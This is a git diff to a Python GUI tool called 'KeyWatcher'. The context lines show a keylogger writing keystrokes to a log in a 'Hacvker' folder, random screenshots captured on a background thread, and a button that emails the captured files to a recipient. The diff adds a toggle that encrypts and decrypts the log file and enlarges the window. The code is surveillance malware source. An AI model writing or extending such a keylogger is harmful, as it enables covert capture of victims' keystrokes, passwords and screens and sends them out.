@@ -31,7 +31,7 @@ EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
 EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 root = Tk()
 root.title("KeyWatcher")
-root.geometry('350x200')
+root.geometry('350x400')
 
  
 log_dir = r"D:/Hacvker/"
@@ -39,6 +39,9 @@ logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, fo
 keylogger_running = False
 listener = None
 mouse_listener = None
+is_encrypted = False
+encryption_key = None
+encryption_iv = None
 
 current_date= datetime.datetime.now().strftime("%Y-%m-%d")
 date_dir = os.path.join(log_dir,current_date)
@@ -143,12 +146,31 @@ def take_random_screenshots():
         myScreenshot = pyautogui.screenshot()
         myScreenshot.save(file_name)
         print(f"Screenshot saved as {file_name}")
+def toggle_encrypt_decrypt():
+    global is_encrypted, encryption_key, encryption_iv
+    if is_encrypted:
+        if encryption_key and encryption_iv:
+            decrypt_file(encryption_key, encryption_iv)
+            encrypt_button.config(text="Encrypt File")
+            print("File decrypted successfully!")
+            is_encrypted = False
+        else:
+            print("Decryption failed: Missing key or IV.")
+    else:
+        encryption_key, encryption_iv = encrypt_file()
+        if encryption_key and encryption_iv:
+            encrypt_button.config(text="Decrypt File")
+            print("File encrypted successfully!")
+            is_encrypted = True
+        else:
+            print("Encryption failed.")
 
 screenshot_thread = threading.Thread(target=take_random_screenshots, daemon=True)
 screenshot_thread.start()
 
 toggle_button = Button(root, text="Start Keylogger", command=start_keylogger)
 toggle_button.pack(pady=20)
+
 
 recipient_label = Label(root, text="Enter recipient email:")
 recipient_label.pack()
@@ -157,6 +179,9 @@ recipient_email_entry.pack(pady=5)
 
 send_button = Button(root, text="Send email", command=send_email_with_attachment)
 send_button.pack(pady=20)
+
+encrypt_button = Button(root, text="Encrypt File", command=toggle_encrypt_decrypt)
+encrypt_button.pack(pady=20)
 
 
 
